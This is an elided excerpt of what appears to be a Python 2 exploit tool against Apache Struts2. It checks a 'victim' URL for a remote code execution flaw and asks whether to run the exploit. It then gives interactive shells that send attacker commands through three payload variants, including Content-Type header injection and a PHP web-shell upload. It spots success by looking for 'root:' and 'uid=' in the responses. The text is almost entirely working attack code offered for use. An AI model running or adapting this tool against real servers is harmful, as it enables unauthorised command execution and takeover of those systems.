...
print " * Example: http(s)://www.victim.com/files.login\n"
...
if len(host) > 0:
	if host.find("https://") != -1 or host.find("http://") != -1:
		...
		if response.read().find("mamalo") != -1:
			...
			option = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (y/n): "+ENDC)
			...
			if option == 'y':
				...
				print OTRO+"     Struts@Shell:$ pwd (php)\n"+ENDC

				while 1:
					separator = raw_input(GREEN+"Struts2@Shell_1:$ "+ENDC)
					space = separator.split(' ')
					command = "','".join(space)

					if space[0] != 'reverse' and space[0] != 'pwd':
						shell = urllib2.urlopen(host+exploit("'"+str(command)+"'"))
						print "\n"+shell.read()
					elif space[0] == 'pwd':
						...
						if space[1] == 'php':
							...
							urllib2.urlopen(host+pwd(str(shellfile)))
			  	...
			  	if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find("inet") != -1 or result.find("root:") != -1 or result.find("uid=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
					...
					if option == 'y':
						...
						time.sleep(1)
					  	...
					  	while 1:
							try:
								separator = raw_input(GREEN+"\nStruts2@Shell_2:$ "+ENDC)
								req = urllib2.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(separator))})
								result = urllib2.urlopen(req).read()
								print "\n"+result
							except:
								exit(0)
				...
				if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find("inet") != -1 or result.find("root:") != -1 or result.find("uid=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
					...
					if option == 'y':
						...
						print OTRO+"     Struts@Shell:$ pwd (php)\n"+ENDC
					  	...
					  	while 1:
							separator = raw_input(GREEN+"Struts2@Shell_3:$ "+ENDC)
							space = separator.split(' ')
							command = "%20".join(space)

							shell = urllib2.urlopen(host+exploit3(str(command)))
							print "\n"+shell.read()
